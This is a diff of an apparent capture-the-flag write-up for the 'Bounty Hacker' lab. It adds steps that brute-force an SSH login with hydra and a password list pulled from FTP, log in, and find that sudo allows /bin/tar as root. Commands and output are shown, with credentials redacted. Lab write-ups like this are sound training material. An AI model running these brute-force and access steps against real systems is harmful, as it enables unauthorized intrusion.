@@ -139,11 +139,7 @@ remote: task.txt
 68 bytes received in 0.00 secs (327.1244 kB/s)
 ```
 
-The output of task.txt tells me the user that wrote the file. I note this as a possible username for future tasks. The locks.txt file seems to be a password list. I don't have any other files on the ftp server so I'll move on.
-
-## What service can you brute force with the text file found?
-
-From here, I only have the ssh and http services on the machine to check. Since I got a username and a wordlist, I'll try to brute force ssh.
+The output of task.txt tells me the user that wrote the file. I note this as a possible username for future tasks. The locks.txt file seems to be a password list.
 
 I download the locks.txt file to my attack box and call it passwords.txt. The command I ran is the following:
 
@@ -154,4 +150,61 @@ local: passwords.txt remote: locks.txt
 150 Opening BINARY mode data connection for locks.txt (418 bytes).
 226 Transfer complete.
 418 bytes received in 0.00 secs (6.0399 MB/s)
+```
+
+I exit out of ftp by typing the following:
+
+```bash
+ftp> quit
+221 Goodbye.
+```
+
+I don't have any other files on the ftp server so I'll move on.
+
+## What service can you brute force with the text file found and what is the users password?
+
+From here, I only have the ssh and http services on the machine to check. Since I got a username and a wordlist, I'll try to brute force ssh.
+
+I am going to use hydra to try brute forcing the password of the username I found in task.txt. Here is the command that I used:
+
+```bash
+hydra -l REDACTED -P passwords.txt target.thm ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-18 19:00:15
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://target.thm:22/
+[22][ssh] host: target.thm   login: REDACTED   password: REDACTED
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-18 19:00:18
+```
+
+It turns out that we can brute force the ssh service and hydra has given me the password.
+
+## Getting a Foothold
+
+I ssh into the box user the username and password provided by hydra. Here is the command:
+
+```bash
+$ ssh REDACTED@target.thm
+```
+
+I have a shell. I'm in!
+
+## Privilege Escalation
+
+I ran my [usual list of commands](../../README.md#linux-privilege-escalation). Running sudo -l did yield some interesting results:
+
+```bash
+sudo -l
+[sudo] password for REDACTED: 
+Matching Defaults entries for REDACTED on bountyhacker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User REDACTED may run the following commands on bountyhacker:
+    (root) /bin/tar
 ```
